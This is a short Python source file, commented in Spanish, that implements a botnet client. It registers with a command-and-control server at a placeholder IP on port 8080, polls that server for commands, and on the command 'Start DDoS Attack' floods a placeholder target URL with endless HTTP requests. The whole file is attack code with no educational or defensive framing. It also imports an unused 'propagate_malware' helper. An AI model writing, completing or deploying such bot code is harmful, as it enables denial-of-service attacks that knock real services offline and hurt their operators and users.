import requests
import time
import random
from bot.bot_utils import connect_to_c2, propagate_malware

def connect_to_c2():
    c2_server = "http://<IP_DEL_C2>:8080"  # Dirección IP del servidor C2
    bot_ip = get_bot_ip()

    while True:
        # Registrarse en el servidor C2 con la IP del bot
        try:
            response = requests.post(c2_server + '/register', data={'ip': bot_ip})
            print(f"Bot {bot_ip} registrado exitosamente")
        except requests.exceptions.RequestException as e:
            print(f"Error al conectar con el C2: {e}")
            time.sleep(5)
            continue

        # Esperar el comando
        response = requests.get(c2_server + '/command')
        if response.text == "Start DDoS Attack":
            start_attack(bot_ip)

        time.sleep(5)

def start_attack(bot_ip):
    print(f"{bot_ip} iniciando ataque DDoS...")
    target_url = "http://<IP_DEL_SERVIDOR_OBJETIVO>/index.html"
    
    while True:
        try:
            response = requests.get(target_url)
            print(f"Solicitud enviada desde {bot_ip}, status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error en ataque desde {bot_ip}: {e}")

def get_bot_ip():
    # Puedes usar una IP estática o alguna lógica para obtener la IP real del bot
    return "Bot_" + str(random.randint(1, 1000))

if __name__ == '__main__':
    connect_to_c2()
